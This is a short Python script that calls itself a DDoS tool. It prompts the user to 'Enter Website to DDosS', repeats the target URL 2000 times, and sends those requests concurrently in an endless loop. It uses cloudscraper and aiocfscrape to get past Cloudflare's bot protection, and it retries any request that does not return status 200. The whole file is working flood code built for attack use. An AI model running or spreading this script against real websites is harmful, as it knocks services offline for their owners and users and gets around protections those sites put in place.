import time as ti
from termcolor import colored

#import aiohttp
import asyncio
import cloudscraper as c
from aiocfscrape import CloudflareScraper



class syn():
	def __init__(self,urls):
		self.urls=urls
		self.counter = 0
		self.cls = c.create_scraper()

	def N_Req(self):
		n_results = []
		for l in self.urls:
			code = 0
			while code != 200:
				try:
					r = self.cls.get(l)
					if r.status_code == 200:
						n_results.append(r.text)
						print(f"{l} : {colored(r.status_code,'green')} \nHandeled ({self.counter}) requests")
						self.counter+=1
						code = 200
					else:
						print(colored(l+" : "+str(r.status_code)+" ...Bad response\nRetrying... Handeled ("+str(self.counter)+") requests",'red'))
						ti.sleep(2)
				except Exception as e:
					print(e)
					print(colored("Error Encountered.\nRtrying",'red'))
					ti.sleep(10)
					continue
		return n_results



	async def fetch(self,session, url):
		code = 0
		n = 1
		while code != 200:
			try:
				async with session.get(url) as response:
					if response.status == 200:
						print(f"{url} : {colored(response.status,'green')} \nHandeled ({self.counter}) requests")
						code = 200
						self.counter+=1
						return await response.text()
					else:
						print(colored(url+" : "+str(response.status)+" ...Bad response\nRetrying... Handeled ("+str(self.counter)+") requests",'red'))
			except Exception as e:
				print(e)
				print(colored("Error Encountered.\nRtrying",'red'))	
				continue

	async def fetch_all(self,urls):
		async with CloudflareScraper() as session:
			tasks = []
			for url in urls:
				task = asyncio.ensure_future(self.fetch(session, url))
				tasks.append(task)
			responses = await asyncio.gather(*tasks)
			return responses

	def main(self):
		self.loop = asyncio.get_event_loop()
		self.results = self.loop.run_until_complete(self.fetch_all(self.urls))
		print("")

if __name__ == "__main__":
    u = input(colored("Enter Website to DDosS : ","red"))
    uu = []
    for i in range(2000):
        uu.append(u)
    while True:
        s = syn(uu)
        s.main()
